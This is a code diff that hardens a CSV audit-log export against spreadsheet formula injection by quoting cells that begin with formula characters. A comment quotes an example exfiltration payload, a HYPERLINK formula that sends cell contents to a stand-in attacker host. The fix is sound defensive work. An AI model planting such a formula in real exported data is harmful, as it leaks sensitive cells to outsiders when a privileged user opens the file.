@@ -148,7 +148,25 @@ function toCsv(rows: AuditRow[]): string {
   return lines.join("\n");
 }
 
-function csvCell(value: string): string {
+// Characters that turn a CSV cell into a spreadsheet formula when the file
+// is opened in Excel / Sheets / LibreOffice. Several audit-log columns are
+// attacker-controllable (userAgent comes verbatim from the User-Agent header;
+// targetId/metadata flow from request bodies). An attacker who can write
+// an audit row can ship a payload like
+//   =HYPERLINK("http://evil/?"&A1, "x")
+// that exfiltrates other cells when a privileged user opens the export.
+// OWASP "CSV Injection" — neutralise by prefixing a single quote (which all
+// three spreadsheet apps treat as a literal, non-formula marker) and force
+// quoting so the prefix is preserved through Excel's auto-formatting.
+const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+// Exported only for unit tests. Next.js only treats the HTTP-method exports
+// as route handlers; this is plain TS and is not routed.
+export function csvCell(value: string): string {
+  const dangerous = CSV_FORMULA_PREFIX.test(value);
+  if (dangerous) {
+    return `"'${value.replace(/"/g, '""')}"`;
+  }
   if (value.includes('"') || value.includes(",") || value.includes("\n") || value.includes("\r")) {
     return `"${value.replace(/"/g, '""')}"`;
   }
